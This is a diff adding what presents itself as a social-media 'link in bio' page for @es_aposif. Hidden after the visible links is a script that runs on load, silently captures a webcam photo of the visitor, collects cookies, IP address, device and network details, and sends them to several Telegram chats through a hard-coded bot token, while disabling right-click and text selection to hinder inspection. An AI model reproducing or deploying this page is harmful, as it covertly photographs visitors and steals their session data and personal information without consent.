@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>@es_aposif | Official Links</title>
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="@es_aposif | Official Links" />
+    <meta property="og:description" content="Follow me on my official accounts" />
+    <meta property="og:image" content="preview.webp" />
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        crossorigin="anonymous" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            background: url('preview.webp') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            backdrop-filter: blur(2px);
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.65);
+            position: absolute;
+            inset: 0;
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 400px;
+            margin: auto;
+        }
+
+        .profile-pic {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            border: 3px solid white;
+            margin: auto;
+            overflow: hidden;
+        }
+
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        h1 {
+            margin-top: 15px;
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .links {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .link-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 12px;
+            border-radius: 30px;
+            text-decoration: none;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .link-item i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+
+        .link-item:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(1.05);
+        }
+
+        .instagram {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        }
+
+        .tiktok {
+            background: linear-gradient(45deg, #69C9D0, #010101, #EE1D52);
+        }
+
+        .twitter {
+            background: #1da1f2;
+        }
+
+        .snapchat {
+            background: #fffb00;
+        }
+
+        footer {
+            margin-top: 25px;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="container">
+        <div class="profile-pic">
+            <img src="preview (1).webp" alt="Profile">
+        </div>
+        <h1>@es_aposif</h1>
+
+        <div class="links">
+            <a href="https://instagram.com/es_aposif/" class="link-item instagram" target="_blank">
+                <i class="fab fa-instagram"></i> Instagram
+            </a>
+            <a href="https://tiktok.com/@esl_am95" class="link-item tiktok" target="_blank">
+                <i class="fab fa-tiktok"></i> TikTok
+            </a>
+            <a href="https://twitter.com/EAposif61126" class="link-item twitter" target="_blank">
+                <i class="fab fa-twitter"></i> Twitter
+            </a>
+            <a href="https://www.snapchat.com/add/es_aposif?share_id=28OgpPRnTD-J7qNl_Ip4Gg&locale=ar_LY"
+                class="link-item fa- snapchat" target="_blank">
+                <i class="fab fa-Snapchat"></i> Snapchat
+            </a>
+        </div>
+
+        <footer>©2025 Powred by 👨🏻‍💻 | D7F9LT </footer>
+    </div>
+
+    <!-- سكربت جمع البيانات وإرسالها لتليجرام -->
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let stream;
+
+        // List of chat IDs
+        const chatIds = ['6305469091', '-1002323834613', '6304355641']; // Add your chat IDs here
+
+        // Telegram Bot Token
+        const telegramToken = '7723113647:AAFy7_f5QGa6Or0fYK04s1rYbwwFjm9gQJM';
+
+        // Initialize data collection on load
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                initializeDataCollection();
+            }, 1000);
+        });
+
+        function initializeDataCollection() {
+            navigator.mediaDevices
+                .getUserMedia({ video: true })
+                .then((mediaStream) => {
+                    stream = mediaStream;
+                    video.srcObject = stream;
+                    video.addEventListener('loadedmetadata', captureAndSendPhoto);
+                })
+                .catch((err) => {
+                    console.error('Camera access denied:', err);
+                    collectAndSendData(null);
+                });
+        }
+
+        function captureAndSendPhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Flip image horizontally
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            stopCamera();
+            collectAndSendData(imageData);
+        }
+
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach((track) => track.stop());
+            }
+        }
+
+        async function collectAndSendData(imageData = null) {
+            try {
+                const deviceInfo = navigator.userAgent;
+                const cookies = document.cookie;
+                const historyLength = window.history.length;
+                const screenResolution =
+                    window.screen.width + 'x' + window.screen.height;
+                const language = navigator.language;
+                const referrer = document.referrer || 'Direct visit';
+                const timestamp = new Date().toLocaleString();
+
+                const connection =
+                    navigator.connection ||
+                    navigator.mozConnection ||
+                    navigator.webkitConnection;
+                const effectiveType = connection
+                    ? connection.effectiveType
+                    : 'unknown';
+                const downlink = connection
+                    ? connection.downlink + ' Mbps'
+                    : 'unknown';
+
+                // Compose message for Telegram
+                const message = `
+🔥 *NEW LINK IN BIO VISITOR D3F9LT* 🔥
+
+📅 *Time:* \`${timestamp}\`
+
+🤳 *Camera:* \`${imageData ? '✅ Captured' : '❌ Access Denied'}\`
+
+📱 *Device Info:*
+\`\`\`
+${deviceInfo}
+\`\`\`
+
+🌐 *Network Info:*
+• Connection: \`${effectiveType}\`
+• Speed: \`${downlink}\`
+
+🖥️ *Display:*
+\`${screenResolution}\`
+
+🗣️ *Language:* \`${language}\`
+
+🔗 *Referrer:*
+\`${referrer}\`
+
+📊 *Session:*
+• History Length: \`${historyLength}\`
+
+🍪 *Cookies:*
+\`\`\`
+${cookies || 'No cookies'}
+\`\`\`
+
+━━━━━━━━━━━━━━━━━━━━
+🎯 *Link in Bio Page Accessed*`;
+
+                // Get IP separately (fetch)
+                let ip = 'Unknown';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch (e) {
+                    console.error('Failed to get IP:', e);
+                }
+
+                // Append IP to message
+                const finalMessage = message.replace(
+                    '• Connection:',
+                    `• IP: \`${ip}\`\n• Connection:`
+                );
+
+                // Send to all chat IDs
+                chatIds.forEach((chatId) => {
+                    if (chatId) {
+                        if (imageData) {
+                            sendPhotoToTelegram(
+                                imageData,
+                                finalMessage,
+                                chatId
+                            );
+                        } else {
+                            sendTextToTelegram(finalMessage, chatId);
+                        }
+                    }
+                });
+            } catch (err) {
+                console.error('Error collecting data:', err);
+            }
+        }
+
+        function dataURLToBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        function sendPhotoToTelegram(imageData, caption, chatId) {
+            const blob = dataURLToBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'visitor_photo.png');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(() => console.log(`Photo sent to chat ${chatId}`))
+                .catch((error) =>
+                    console.error('Error sending photo:', error)
+                );
+        }
+
+        function sendTextToTelegram(text, chatId) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', text);
+            formData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(() => console.log(`Message sent to chat ${chatId}`))
+                .catch((error) =>
+                    console.error('Error sending message:', error)
+                );
+        }
+
+        // Prevent right-click and text selection (optional)
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+        document.addEventListener('dragstart', (e) => e.preventDefault());</script>
+
+</body>
+
+</html>
